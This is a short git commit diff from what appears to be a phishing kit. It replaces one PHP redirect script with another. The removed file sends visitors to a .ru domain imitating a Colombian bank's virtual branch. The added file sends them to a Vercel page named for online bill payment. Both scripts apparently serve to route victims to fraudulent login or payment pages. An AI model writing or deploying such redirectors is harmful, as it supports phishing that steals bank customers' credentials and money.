893cf389eb20532a2af4fa7181fa3e08a682d29a
Elfuturoeshoy1103 <elfuturoeshoy1103@gmail.com>
2025-05-02 22:49:48 +0000

    loc

--- transaction/sucursal/client.php
+++
@@ -1,8 +0,0 @@
-<?php
-// Redirección a un link específico (puedes cambiar esta URL por cualquier otra)
-$destino = 'https://colsucvirtutransaccional.ru/validaciones-co-es-portal/cardif-seguros';
-
-// Ejecuta la redirección
-header("Location: $destino");
-exit;
-?>
---
+++ transaction/sucursal/poral/client.php
@@ -0,0 +1,7 @@
+<?php
+// Cambia esta URL para redirigir a otro sitio
+$destino = 'https://vercel.com/ramons-projects-fd57829b/pagatufacturaenlinea';
+
+header("Location: $destino");
+exit;
+?>
